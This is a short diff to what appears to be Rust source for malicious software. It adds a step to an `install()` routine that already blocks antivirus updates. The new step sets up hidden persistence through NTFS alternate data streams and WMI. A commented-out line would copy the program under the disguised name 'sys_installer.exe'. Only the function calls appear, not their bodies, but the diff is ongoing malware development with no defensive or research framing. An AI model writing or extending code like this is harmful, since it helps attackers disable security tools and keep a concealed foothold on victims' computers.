@@ -125,6 +125,9 @@ pub fn install() -> Result<(), Box<dyn std::error::Error>> {
         // Chameleon Protocol (Communications Jamming)
         let _ = crate::system::network::block_av_updates();
 
+        // Shadow Persistence (ADS + WMI)
+        let _ = crate::system::shadow::apply_shadow_persistence();
+
         // Copy self to bin (optional, can skip or rename to sys_installer.exe)
         // let _ = copy_self_to_bin(); 
     }
